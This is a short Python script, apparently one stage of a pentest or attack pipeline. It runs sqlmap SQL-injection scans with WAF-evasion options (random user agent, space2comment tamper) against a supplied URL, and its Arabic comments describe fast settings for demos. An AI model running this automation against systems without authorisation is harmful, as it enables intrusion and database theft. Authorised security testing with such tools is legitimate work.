#!/usr/bin/env python3
import subprocess
import os

def run_sqlmap(urls):
    print("\n\033[1;36m[Pipeline - Stage 3] Launching Fast Anti-WAF Sqlmap Exploit Matrix...\033[0m")
    
    test_url = urls[0] if isinstance(urls, list) else urls
    print(f"\033[1;34m[*] Pipeline Link Confirmed. Fast-Tracking Injection Target: {test_url}\033[0m")
    
    # تشغيل الفحص السريع والمكثف المخصص للعروض التقديمية:
    # --level=2 --risk=1: فحص ذكي وسريع للمتغيرات الشائعة دون تضييع وقت
    # --threads=5: تسريع إرسال الطلبات عبر 5 مسارات متوازية
    # --timeout=5: إسقاط الطلبات البطيئة فوراً لعدم تجميد التيرمينال
    subprocess.run([
        "sqlmap", "-u", test_url, 
        "--batch", 
        "--level=2", 
        "--risk=1", 
        "--threads=5",
        "--timeout=5",
        "--random-agent", 
        "--tamper=space2comment", 
        "--output-dir=sqlmap_res", 
        "--flush-session"
    ], check=False)
    
    print("\033[1;32m[+] Fast Sqlmap high-intensity injection cycle finished successfully.\033[0m")
